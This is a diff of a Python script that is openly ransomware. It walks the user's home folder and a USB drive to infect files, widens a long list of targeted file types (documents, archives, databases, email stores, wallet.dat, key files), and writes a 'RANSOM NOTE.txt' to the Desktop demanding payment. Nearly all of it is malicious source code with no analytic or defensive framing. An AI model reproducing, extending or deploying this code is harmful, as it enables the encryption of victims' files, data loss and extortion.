@@ -16,23 +16,23 @@ status = 'INFECTED'
 
 
 f_name = []
-targets = ('.txt', '.docx', '.doc', '.lnk',
-           '.xlsx', '.pdf', '.zip', '.ppt',
-           '.jpg', '.jpeg', 'gif', '.mp3',
-           '.mp4', '.svg', '.ico', '.3gp',
-           'ink', '.gz', '.rar', '.wav',
-           '.iso', '.java', '.html', '.css',
-           '.key', '.enc', '.png', 'wallet.dat',
-           '.cvs')
+targets = ('.txt', '.docx', '.doc', '.lnk', '.xlsx', '.pdf', '.zip', '.ppt',
+           '.jpg', '.jpeg', 'gif', '.mp3', '.mp4', '.svg', '.ico', '.3gp',
+           'ink', '.gz', '.rar', '.wav', '.iso', '.java', '.html', '.css',
+           '.key', '.enc', '.png', 'wallet.dat', '.cvs', '.bak', '.xls', '.odt',
+           '.rtf', '.tex', '.7z', '.deb', '.rmp', '.z', '.pkg', '.bin',
+           '.dmg', '.toast', '.db', '.dbf', '.log', '.mdb', '.sav', '.xml',
+           '.xhtml', '.htm', '.email', '.eml', '.msg', '.ost', '.pst', '.vcf',
+           '.jar', '.bat', '.cgi', '.msi', '.gadget', '.tiff', '.tif', '.ai',
+           '.asp', '.aspx', '.odp', '.pptx', '.ods', '.rtx', '.avi', '.wmv')
 
 
 def virus_property():
     # Infect files in current user
     user = getpass.getuser()
-    target = ('txt', '.pdf', '.png', '.exe',
-              '.docx', '.doc', '.lnk', '.zip',
-              '.ppt', '.gz', '.rar', '.jpg',
-              '.jpeg', 'gif')
+    target = ('txt', '.pdf', '.png', '.exe', '.docx', '.doc', '.lnk', '.zip',
+              '.ppt', '.gz', '.rar', '.jpg', '.jpeg', 'gif' '.tar', '.ppt',
+              '.xls', '.xlsx')
     path = 'C:/Users/' + user + '/'
     for r, d, files in os.walk(path):
         for file in files:
@@ -57,10 +57,9 @@ def virus_property():
 
 def usb_infection():
     # Infect Thumb drives In F:// drive
-    target = ('txt', '.pdf', '.png', '.exe',
-              '.docx', '.doc', '.lnk', '.zip',
-              '.ppt', '.gz', '.rar', '.jpg',
-              '.jpeg', 'gif')
+    target = ('txt', '.pdf', '.png', '.exe', '.docx', '.doc', '.lnk', '.zip',
+              '.ppt', '.gz', '.rar', '.jpg', '.jpeg', 'gif', '.tar', '.ppt',
+              '.xls', '.xlsx')
     path = 'F:\\'
     try:
         for r, d, files in os.walk(path):
@@ -122,15 +121,17 @@ def message():
 
 
 def ransom_note():
-    # Create ransome note .txt
+    # Create ransom note .txt
     usr = getpass.getuser()
     path = 'C:/Users/' + usr + '/Desktop/'
     try:
         with open(path + "RANSOM NOTE.txt", "w+") as file:
-            file.write("""
+            file.write(
+"""
 WE HAVE COMPROMISED YOUR COMPUTER AND ENCRYPTED YOUR FILES
 PAY UP
-""")
+"""
+            )
     except Exception as e:
         print(e)
         pass
